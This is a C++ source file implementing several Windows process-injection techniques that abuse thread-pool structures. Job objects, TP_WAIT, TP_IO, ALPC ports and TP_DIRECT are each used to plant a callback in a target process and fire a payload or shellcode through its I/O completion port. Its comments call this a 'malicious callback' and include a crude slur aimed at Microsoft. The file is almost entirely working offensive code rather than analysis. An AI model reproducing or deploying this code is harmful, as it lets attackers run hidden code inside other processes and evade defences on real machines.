#include "injection.hpp"
#define MY_MESSAGE "I did it for the vine."




bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {

	HANDLE hJob = NULL;				NTSTATUS status = 0x00;
	void* remoteMemory = nullptr;			PFULL_TP_JOB pFullTpJob = { 0 };
	size_t regionSize = NULL;			JOBOBJECT_ASSOCIATE_COMPLETION_PORT completionPort = { 0 };




	fnTpAllocJobNotification pTpAllocJobNotification =
		reinterpret_cast<fnTpAllocJobNotification>(GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "TpAllocJobNotification"));

	if (pTpAllocJobNotification ==  nullptr) {
		std::cerr << "failed to acquire function pointers.\n" << std::endl;
		return false;
	}


	hJob = CreateJobObjectA(NULL, "Urien's Job");
	if (hJob == NULL) {
		WIN32_ERR(CreateJobObjectA);
		return false;
	}


	status = pTpAllocJobNotification(&pFullTpJob, //this should fill the "FULL_TP_JOB" structure
		hJob,
		payloadAddress,
		nullptr,
		nullptr);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(TpAllocJobNotification, status);
		return false;
	}


	remoteMemory = VirtualAllocEx(targetProcess,
		nullptr,
		sizeof(FULL_TP_JOB),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remoteMemory == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}


	if (!WriteProcessMemory(targetProcess, //Write job callback struct
		remoteMemory,
		pFullTpJob,
		sizeof(FULL_TP_JOB),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}


	//
	// We have to zero out the associated completion port first, not sure why.
	// Need to look into this later
	//

	if (!SetInformationJobObject(hJob,
		JobObjectAssociateCompletionPortInformation,
		&completionPort,
		sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {

		WIN32_ERR(SetInformationJobObject[1]);
		return false;
	}



	//
	// Associate completion port with payload
	//

	completionPort.CompletionKey = remoteMemory;
	completionPort.CompletionPort = hIoPort;

	if (!SetInformationJobObject(hJob,
		JobObjectAssociateCompletionPortInformation,
		&completionPort,
		sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {

		WIN32_ERR(SetInformationJobObject[2]);
		return false;
	}


	//
	// Queue IO packet to job object completion port
	//

	if (!AssignProcessToJobObject(hJob, GetCurrentProcess())) {

		WIN32_ERR(AssignProcessToJobObject);
		return false;
	}

	return true;
}




bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {

	fnNtAssociateWaitCompletionPacket pNtAssociateWaitCompletionPacket = nullptr;

	PFULL_TP_WAIT pTpWait = nullptr;		void* remoteTpWait = nullptr;
	void* remoteTpDirect = nullptr;			HANDLE hEvent = nullptr;
	NTSTATUS status = ERROR_SUCCESS;


	pNtAssociateWaitCompletionPacket = reinterpret_cast<fnNtAssociateWaitCompletionPacket>( //locate this stub

		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAssociateWaitCompletionPacket"));

	if (pNtAssociateWaitCompletionPacket == nullptr) {
		std::cerr << "{!!} Failed to get NtAssociateWaitCompletionPacket Function Pointer." << std::endl;
		return false;
	}




	//
	// Create a TP_WAIT structure that will trigger our callback once an asynchronous event
	// is interacted with, such as through SetEvent.
	//

	pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait(static_cast<PTP_WAIT_CALLBACK>(payloadAddress),
		nullptr,
		nullptr); 

	if (pTpWait == nullptr) {
		WIN32_ERR(CreateThreadPoolWait);
		return false;
	}


	//
	// Allocate and write memory into the process for the TP_WAIT callback structure.
	//

	remoteTpWait = VirtualAllocEx(targetProcess,
		nullptr,
		sizeof(FULL_TP_WAIT),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remoteTpWait == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}


	if (!WriteProcessMemory(targetProcess,
		remoteTpWait,
		pTpWait,
		sizeof(FULL_TP_WAIT),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}


	//
	// Do the same for a TP_DIRECT structure. Note that this is a helper struct,
	// used to trigger the actual callback once an IO packet is sent.
	//

	remoteTpDirect = VirtualAllocEx(targetProcess, 
		nullptr,
		sizeof(TP_DIRECT),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remoteTpDirect == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}

	if (!WriteProcessMemory(targetProcess,
		remoteTpDirect,
		&pTpWait->Direct,
		sizeof(TP_DIRECT),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}


	//
	// Create event object
	//

	hEvent = CreateEventW(nullptr, FALSE, FALSE, L"Urien's Event Object");
	if (hEvent == NULL) {
		WIN32_ERR(CreateEventW);
		return false;
	}


	status = pNtAssociateWaitCompletionPacket(pTpWait->WaitPkt, //< This Wait packet is associated with the shellcode
		hIoPort,												//< Where to send this packet once event is signaled
		hEvent,													//< The event object in question
		remoteTpDirect,											//< The helper structure or "key" that gets looked at when a signal occurs
		remoteTpWait,											//< The actual callback
		0,
		0,
		nullptr);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtAssociateWaitCompletionPacket, status);
		return false;
	}


	//
	// Queue the IO packet, triggering the callback
	//

	SetEvent(hEvent);

	return true;
}



bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {

	wchar_t fullFilePath[MAX_PATH] = { 0 };						wchar_t tempPath[MAX_PATH] = { 0 };
	HANDLE hFile = nullptr;										PFULL_TP_IO pTpIo = nullptr;
	void* pRemoteTpIo = nullptr;								IO_STATUS_BLOCK ioStatusBlock = { 0 };
	fnNtSetInformationFile pNtSetInformationFile = nullptr;		FILE_COMPLETION_INFORMATION fileCompletionInfo = { 0 };
	NTSTATUS status = 0x00;										uint32_t bytesWritten = NULL;
	OVERLAPPED overlapped = { 0 };


	pNtSetInformationFile = reinterpret_cast<fnNtSetInformationFile>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetInformationFile"));

	if (pNtSetInformationFile == nullptr) {
		std::cerr << "{!!} Failed to get NtSetInformationFile Function Pointer." << std::endl;
	}

	


	//
	// Create a random file we can use
	//

	if (!GetTempPathW(MAX_PATH, tempPath)) {
		WIN32_ERR(GetTempPathW);
		return false;
	}

	if (!GetTempFileNameW(tempPath, L"UR", 0, fullFilePath)) {
		WIN32_ERR(GetTempFileNameW);
		return false;
	}

	hFile = CreateFileW(fullFilePath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, //this second flag is crucial for the signal to work
		nullptr);

	if (hFile == INVALID_HANDLE_VALUE) {
		WIN32_ERR(CreateFileW);
		return false;
	}



	//
	// Create TP_IO structure for our callback.
	// Note: due to Microsoft's extreme retardation, the callback address
	// does not get instantiated correctly within the struct so we need to do it ourselves.
	//

	pTpIo = reinterpret_cast<PFULL_TP_IO>(CreateThreadpoolIo(hFile,
		static_cast<PTP_WIN32_IO_CALLBACK>(payloadAddress), 
		nullptr, 
		nullptr));

	if (pTpIo == nullptr) {
		WIN32_ERR(CreateThreadPoolIo);
		return false;
	}

	pTpIo->CleanupGroupMember.Callback = payloadAddress;
	++(pTpIo->PendingIrpCount);



	//
	// Allocate TP_IO memory and write
	//

	pRemoteTpIo = VirtualAllocEx(targetProcess,
		nullptr, 
		sizeof(FULL_TP_IO), 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE);

	if (pRemoteTpIo == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}


	if (!WriteProcessMemory(targetProcess,
		pRemoteTpIo,
		pTpIo,
		sizeof(FULL_TP_IO),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}

	

	//
	// Associate the file with the target process' IO completion port.
	// Any interaction with the file will now send a packet to the completion port, triggering the callback.
	//

	fileCompletionInfo.Key = &( reinterpret_cast<PFULL_TP_IO>(pRemoteTpIo)->Direct );
	fileCompletionInfo.Port = hIoPort;
	
	status = pNtSetInformationFile(hFile,
		&ioStatusBlock,
		&fileCompletionInfo,
		sizeof(FILE_COMPLETION_INFORMATION),
		static_cast<FILE_INFORMATION_CLASS>(61));

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtSetInformationFile, status);
		return false;
	}



	//
	// Trigger the callback via file interaction.
	//

	if (!WriteFile(hFile,
		MY_MESSAGE,
		sizeof(MY_MESSAGE),
		nullptr,
		&overlapped) && GetLastError() != ERROR_IO_PENDING) {

		WIN32_ERR(WriteFile);
		return false;
	}

	return true;
}




void _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc) {	//0xfffc is the maximum length permitted by microsoft for this struct
			Length = 0xfffc;
		}

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR); //Account for null terminator.
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}




//
// ALPC or Advanced Local Procedure Call objects are kernel objects that facilitate inter-process communication.
// They are very similar to named pipes, but operate on a "connection" basis rather than
// named pipes which are often connectionless.
//

bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {

	// Local Variables
	NTSTATUS status = 0x00;						fnNtAlpcCreatePort pNtAlpcCreatePort = nullptr;
	HANDLE hTempApcPort = nullptr;				fnTpAllocAlpcCompletion pTpAllocAlpcCompletion = nullptr;
	void* remoteTpAlpc = nullptr;				fnNtAlpcSetInformation pNtAlpcSetInformation = nullptr;
	std::string alpcMessageString = MY_MESSAGE;	fnNtAlpcConnectPort pNtAlpcConnectPort = nullptr;


	UNICODE_STRING usAlpcPortName = { 0 };		PFULL_TP_ALPC pFullTpAlpc = nullptr;		
	OBJECT_ATTRIBUTES objectAttributes = { 0 };	ALPC_PORT_ATTRIBUTES alpcPortAttributes = { 0 };
	HANDLE hRealApcPort = nullptr;				

	OBJECT_ATTRIBUTES clientAlpcAttributes = { 0 };



	pNtAlpcCreatePort = reinterpret_cast<fnNtAlpcCreatePort>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcCreatePort"));
	pTpAllocAlpcCompletion = reinterpret_cast<fnTpAllocAlpcCompletion>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "TpAllocAlpcCompletion"));
	pNtAlpcSetInformation = reinterpret_cast<fnNtAlpcSetInformation>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcSetInformation"));
	pNtAlpcConnectPort = reinterpret_cast<fnNtAlpcConnectPort>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcConnectPort"));

	if (pNtAlpcCreatePort == nullptr || pTpAllocAlpcCompletion == nullptr || pNtAlpcSetInformation == nullptr || pNtAlpcConnectPort == nullptr) {
		std::cerr << "{!!} Failed to get ALPC-related function pointers." << std::endl;
		return false;
	}



	//
	// Create ALPC object
	//

	status = pNtAlpcCreatePort(&hTempApcPort,
		nullptr,
		nullptr);
	
	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtAlpcCreatePort, status);
		return false;
	}



	//
	// Create ALPC callback structure
	//
	
	status = pTpAllocAlpcCompletion(&pFullTpAlpc,
		hTempApcPort,
		static_cast<PTP_ALPC_CALLBACK>(payloadAddress),
		nullptr,
		nullptr);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(TpAllocAlpcCompletion, status);
		return false;
	}



	//
	// Create Second Port
	//

	_RtlInitUnicodeString(&usAlpcPortName, L"\\RPC Control\\UriensApcPort"); //kernel object namespace

	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	objectAttributes.ObjectName = &usAlpcPortName;

	alpcPortAttributes.Flags = 0x20000;
	alpcPortAttributes.MaxMessageLength = 328;

	status = pNtAlpcCreatePort(&hRealApcPort,
		&objectAttributes,
		&alpcPortAttributes);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtAlpcCreatePort, status);
		return false;
	}



	//
	// Copy ALPC callback struct into target process
	//

	remoteTpAlpc = VirtualAllocEx(targetProcess,
		nullptr,
		sizeof(FULL_TP_ALPC),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remoteTpAlpc == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}

	if (!WriteProcessMemory(targetProcess,
		remoteTpAlpc,
		pFullTpAlpc,
		sizeof(FULL_TP_ALPC),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}



	//
	// Associate the process' IO completion port with our ALPC object
	//

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT alpcAssocCompletionPort = { 0 };
	alpcAssocCompletionPort.CompletionKey = remoteTpAlpc;
	alpcAssocCompletionPort.CompletionPort = hIoPort;

	status = pNtAlpcSetInformation(hRealApcPort,
		2,
		&alpcAssocCompletionPort,
		sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtAlpcSetInformation, status);
	}



	//
	// Now we "only" need to send a message to the ALPC object,
	// which is still INSANELY annoying to do.
	//

	clientAlpcAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	ALPC_MESSAGE clientAlpcMessage = { 0 };
	clientAlpcMessage.PortHeader.u1.s1.DataLength = alpcMessageString.length();
	clientAlpcMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + alpcMessageString.length();

	std::copy(alpcMessageString.begin(), alpcMessageString.end(), clientAlpcMessage.PortMessage);
	size_t clientAlpcMessageSize = sizeof(clientAlpcMessage);



	//
	// if a timeout for the ALPC connection is not specified, it will infinitely block.
	//

	LARGE_INTEGER timeout = { 0 };
	timeout.QuadPart = -10000000;


	//
	// Initiate the ALPC port connection and send IO packet
	//

	HANDLE outHandle = nullptr;
	status = pNtAlpcConnectPort(&outHandle,
		&usAlpcPortName,
		&clientAlpcAttributes,
		&alpcPortAttributes,
		0x20000,
		nullptr,
		(PPORT_MESSAGE)&clientAlpcMessage,
		&clientAlpcMessageSize,		
		nullptr,
		nullptr,
		&timeout
	);

	if (status != ERROR_SUCCESS && status != STATUS_TIMEOUT) {
		NTAPI_ERR(NtAlpcConnectPort, status);
		return false;
	}


	return true;
}




bool InjectViaTpDirect(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {

	TP_DIRECT direct = { 0 };
	void* remoteTpDirect = nullptr;
	fnNtSetIoCompletion pNtSetIoCompletion = nullptr;
	NTSTATUS status = ERROR_SUCCESS;


	direct.Callback = payloadAddress;


	//
	// Allocate remote memory for the TP_DIRECT structure
	//

	remoteTpDirect = VirtualAllocEx(targetProcess,
		nullptr,
		sizeof(TP_DIRECT),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (remoteTpDirect == nullptr) {
		WIN32_ERR(VirtualAllocEx);
		return false;
	}


	if (!WriteProcessMemory(targetProcess,
		remoteTpDirect,
		&direct,
		sizeof(TP_DIRECT),
		nullptr)) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}


	pNtSetIoCompletion = reinterpret_cast<fnNtSetIoCompletion>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetIoCompletion"));
	if (pNtSetIoCompletion == nullptr) {
		std::cerr << "{!!} Failed to get NtSetIoCompletion function pointer." << std::endl;
		return false;
	}


	//
	// Trigger malicious callback
	//

	status = pNtSetIoCompletion(hIoPort, remoteTpDirect, 0, 0, 0);
	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtSetIoCompletion, status);
		return false;
	}

	return true;
}
